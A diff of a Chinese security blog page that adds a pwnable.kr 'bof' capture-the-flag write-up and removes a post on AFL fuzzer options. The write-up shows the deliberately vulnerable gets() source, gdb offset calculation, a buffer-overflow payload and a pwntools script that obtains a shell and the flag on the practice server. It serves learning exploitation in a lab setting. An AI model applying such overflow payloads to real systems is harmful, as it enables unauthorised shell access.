@@ -168,6 +168,129 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/09/14/[pwnable]%20bof/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="ToT">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/09/14/%5Bpwnable%5D%20bof/" class="post-title-link" itemprop="url">[pwnable.kr] bof</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-09-14 05:51:27" itemprop="dateCreated datePublished" datetime="2023-09-14T05:51:27+08:00">2023-09-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-09-20 11:29:52" itemprop="dateModified" datetime="2023-09-20T11:29:52+08:00">2023-09-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/pwnable-kr/" itemprop="url" rel="index"><span itemprop="name">pwnable.kr</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>Nana told me that buffer overflow is one of the most common software vulnerability. </p>
+<p>Is that true?</p>
+<p>Download : <a target="_blank" rel="noopener" href="http://pwnable.kr/bin/bof">http://pwnable.kr/bin/bof</a><br>Download : <a target="_blank" rel="noopener" href="http://pwnable.kr/bin/bof.c">http://pwnable.kr/bin/bof.c</a></p>
+<p>Running at : nc pwnable.kr 9000</p>
+</blockquote>
+<p>终于到了溢出类的题目了，一道很简单的缓冲区溢出，覆盖变量为指定值。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法1 根据两个变量起始地址差距计算</strong></p>
+<ol>
+<li><p>定位输入字符串的起始地址为：0xffffd1fc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  0x5655564c &lt;func+32&gt;    mov    dword ptr [esp], eax</span><br><span class="line">► 0x5655564f &lt;func+35&gt;    call   gets                    &lt;gets&gt;</span><br><span class="line">       arg[0]: 0xffffd1fc ◂— 9 /* &#x27;\t&#x27; */</span><br><span class="line">       arg[1]: 0x20</span><br><span class="line">       arg[2]: 0x0</span><br><span class="line">       arg[3]: 0xffffd3cc ◂— 0x20 /* &#x27; &#x27; */</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>定位key比较时，key所在的地址：0xffffd228 + 8 &#x3D; 0xffffd230</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► 0x56555654 &lt;func+40&gt;    cmp    dword ptr [ebp + 8], 0xcafebabe</span><br></pre></td></tr></table></figure>
+
+<p>所以如果想要覆盖到key的话，需要先填充0xffffd230 - 0xffffd1fc &#x3D; 0x34个字节；</p>
+<p><strong>方法2 gdb查看内存布局</strong></p>
+<p>调试的时候随便输入一个字符串例如AAAA，然后查看栈内存中AAAA和0xdeadbeef的距离</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/50wx $esp</span><br><span class="line">0xffffd1e0:     0xffffd1fc      0x00000020      0x00000000      0xffffd3cc</span><br><span class="line">0xffffd1f0:     0x00000000      0x00000000      0x01000000      0x41414141</span><br><span class="line">0xffffd200:     0xf7fc4500      0x00000000      0xf7c184be      0xf7e2a054</span><br><span class="line">0xffffd210:     0xf7fbe4a0      0xf7fd6f80      0xf7c184be      0xc823bd00</span><br><span class="line">0xffffd220:     0xffffd260      0xf7fbe66c      0xffffd248      0x5655569f</span><br><span class="line">0xffffd230:     0xdeadbeef      0x00000000      0xf7e2a000      0xf7d20ecb</span><br></pre></td></tr></table></figure>
+
+<p>或者使用gdb的find命令，在指定栈内存范围内搜索字符串起始地址和key地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; find $esp, $esp + 200, &quot;AAAA&quot;</span><br><span class="line">0xffffd1fc</span><br><span class="line">1 pattern found.</span><br><span class="line">pwndbg&gt; find $esp, $esp + 200, 0xdeadbeef</span><br><span class="line">0xffffd230</span><br><span class="line">1 pattern found.</span><br></pre></td></tr></table></figure>
+
+<p>0xffffd230 - 0xffffd1fc &#x3D; 0x34</p>
+<p><strong>方法3 常识</strong></p>
+<p>x86情况下，ebp存放上一个栈帧的ebp，ebp + 4是存放的返回地址，ebp + 8是第一个参数的地址、ebp + 12是第二个参数的地址，依次。key是第一个参数。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>那么逻辑就比较清晰了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import sys; sys.stdout.buffer.write(b&#x27;A&#x27; * 52 + b&#x27;\xbe\xba\xfe\xca&#x27;)&quot; &gt; ./payload</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">52</span> + <span class="string">b&#x27;\xbe\xba\xfe\xca&#x27;</span></span><br><span class="line">conn = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Opening connection to pwnable.kr on port 9000: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bof</span><br><span class="line">bof.c</span><br><span class="line">flag</span><br><span class="line">log</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
+
+<h2 id="知识点小结"><a href="#知识点小结" class="headerlink" title="知识点小结"></a>知识点小结</h2><ol>
+<li>gdb搜索内存</li>
+</ol>
+<p>使用命令find来搜索内存中特定的值，语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find start_address, end_address, value</span><br></pre></td></tr></table></figure>
+<p>如果要搜索整个内存空间，使用0和-1作为起始地址和结束地址。</p>
+<ol start="2">
+<li>x86下32为的内存空间布局</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/09/13/[pwnable]%20[fd]/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1217,107 +1340,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/afl%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="ToT">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/13/afl%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E/" class="post-title-link" itemprop="url">afl命令参数说明</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-04-13 09:56:47 / Modified: 09:58:12" itemprop="dateCreated datePublished" datetime="2023-04-13T09:56:47+08:00">2023-04-13</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="AFL-命令参数说明"><a href="#AFL-命令参数说明" class="headerlink" title="AFL 命令参数说明"></a>AFL 命令参数说明</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;</span><br><span class="line"></span><br><span class="line">afl-fuzz [ options ] -- /path/to/fuzzed_app [ ... ]</span><br><span class="line"></span><br><span class="line">Required parameters:</span><br><span class="line"></span><br><span class="line">  -i dir        - input directory with test cases</span><br><span class="line">  -o dir        - output directory for fuzzer findings</span><br><span class="line"></span><br><span class="line">Execution control settings:</span><br><span class="line"></span><br><span class="line">  -f file       - location read by the fuzzed program (stdin)</span><br><span class="line">  -t msec       - timeout for each run (auto-scaled, 50-1000 ms)</span><br><span class="line">  -m megs       - memory limit for child process (50 MB)</span><br><span class="line">  -Q            - use binary-only instrumentation (QEMU mode)</span><br><span class="line">  -U            - use Unicorn-based instrumentation (Unicorn mode)</span><br><span class="line"></span><br><span class="line">Fuzzing behavior settings:</span><br><span class="line"></span><br><span class="line">  -d            - quick &amp; dirty mode (skips deterministic steps)</span><br><span class="line">  -n            - fuzz without instrumentation (dumb mode)</span><br><span class="line">  -x dir        - optional fuzzer dictionary (see README)</span><br><span class="line"></span><br><span class="line">Other stuff:</span><br><span class="line"></span><br><span class="line">  -T text       - text banner to show on the screen</span><br><span class="line">  -M / -S id    - distributed mode (see parallel_fuzzing.txt)</span><br><span class="line">  -C            - crash exploration mode (the peruvian rabbit thing)</span><br><span class="line"></span><br><span class="line">For additional tips, please consult /usr/local/share/doc/afl/README.</span><br></pre></td></tr></table></figure>
-
-<p>必须的参数：</p>
-<ul>
-<li>-i：输入文件夹路径，里面有基本的测试样例</li>
-<li>-o：afl 的输出文件夹路径</li>
-</ul>
-<p>额外控制选项：</p>
-<ul>
-<li>-f：被 fuzz 的程序从何处读取输入，默认是从 stdin 中读取</li>
-<li>-t：每一轮模糊测试的超时时间</li>
-<li>-m：fuzz fork 出来的子进程的内存限制</li>
-<li>-Q：Qemu 模式启动，可以用来 fuzz 其他架构的程序</li>
-<li>-u：unicorn 模式，没有怎么用过</li>
-</ul>
-<p>fuzz 行为设定：</p>
-<ul>
-<li>-d：quick &amp; dirty 模式，没有使用过</li>
-<li>-n：dumb mode，同样没有使用过</li>
-<li>-x dir：额外的 fuzzer 目录，没有使用过</li>
-</ul>
-<p>其他的设定：</p>
-<ul>
-<li>t：banner 的设定</li>
-<li>-M：分布式相关的设定，或者说是并行 fuzz</li>
-<li>-C：crash 探索模式</li>
-</ul>
-<p>这些命令参数的使用目前自己也还不大熟练，对于命令参数的解析在 afl-fuzz.c 的 main 函数中的第一个循环内，如下，可以看出参数的设定并不止帮助提示中的那些：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: <span class="comment">/* input dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_dir) FATAL(<span class="string">&quot;Multiple -i options not supported&quot;</span>);</span><br><span class="line">        in_dir = optarg;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, <span class="string">&quot;-&quot;</span>)) in_place_resume = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>: <span class="comment">/* output dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_dir) FATAL(<span class="string">&quot;Multiple -o options not supported&quot;</span>);</span><br><span class="line">        out_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 这个地方不知道是用来做什么的 */</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123; <span class="comment">/* master sync ID */</span></span><br><span class="line"></span><br><span class="line">          u8* c;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (sync_id) FATAL(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">          sync_id = ck_strdup(optarg);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((c = <span class="built_in">strchr</span>(sync_id, <span class="string">&#x27;:&#x27;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">            *c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(c + <span class="number">1</span>, <span class="string">&quot;%u/%u&quot;</span>, &amp;master_id, &amp;master_max) != <span class="number">2</span> ||</span><br><span class="line">                !master_id || !master_max || master_id &gt; master_max ||</span><br><span class="line">                master_max &gt; <span class="number">1000000</span>) FATAL(<span class="string">&quot;Bogus master ID passed to -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          force_deterministic = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sync_id) FATAL(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">        sync_id = ck_strdup(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>: <span class="comment">/* target file */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_file) FATAL(<span class="string">&quot;Multiple -f options not supported&quot;</span>);</span><br><span class="line">        out_file = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: <span class="comment">/* dictionary */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (extras_dir) FATAL(<span class="string">&quot;Multiple -x options not supported&quot;</span>);</span><br><span class="line">        extras_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>: &#123; <span class="comment">/* timeout */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (timeout_given) FATAL(<span class="string">&quot;Multiple -t options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u%c&quot;</span>, &amp;exec_tmout, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) FATAL(<span class="string">&quot;Bad syntax used for -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (exec_tmout &lt; <span class="number">5</span>) FATAL(<span class="string">&quot;Dangerously low value of -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (suffix == <span class="string">&#x27;+&#x27;</span>) timeout_given = <span class="number">2</span>; <span class="keyword">else</span> timeout_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>: &#123; <span class="comment">/* mem limit */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit_given) FATAL(<span class="string">&quot;Multiple -m options not supported&quot;</span>);</span><br><span class="line">          mem_limit_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(optarg, <span class="string">&quot;none&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            mem_limit = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%llu%c&quot;</span>, &amp;mem_limit, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) FATAL(<span class="string">&quot;Bad syntax used for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">switch</span> (suffix) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: mem_limit *= <span class="number">1024</span> * <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>: mem_limit *= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>: mem_limit /= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:  FATAL(<span class="string">&quot;Unsupported suffix or bad syntax for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit &lt; <span class="number">5</span>) FATAL(<span class="string">&quot;Dangerously low value of -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">sizeof</span>(<span class="type">rlim_t</span>) == <span class="number">4</span> &amp;&amp; mem_limit &gt; <span class="number">2000</span>)</span><br><span class="line">            FATAL(<span class="string">&quot;Value of -m out of range on 32-bit systems&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: &#123; <span class="comment">/* bind CPU core */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (cpu_to_bind_given) FATAL(<span class="string">&quot;Multiple -b options not supported&quot;</span>);</span><br><span class="line">          cpu_to_bind_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u&quot;</span>, &amp;cpu_to_bind) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) FATAL(<span class="string">&quot;Bad syntax used for -b&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: <span class="comment">/* skip deterministic */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (skip_deterministic) FATAL(<span class="string">&quot;Multiple -d options not supported&quot;</span>);</span><br><span class="line">        skip_deterministic = <span class="number">1</span>;</span><br><span class="line">        use_splicing = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="comment">/* load bitmap */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This is a secret undocumented option! It is useful if you find</span></span><br><span class="line"><span class="comment">           an interesting test case during a normal fuzzing process, and want</span></span><br><span class="line"><span class="comment">           to mutate it without rediscovering any of the test cases already</span></span><br><span class="line"><span class="comment">           found during an earlier run.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           To use this mode, you need to point -B to the fuzz_bitmap produced</span></span><br><span 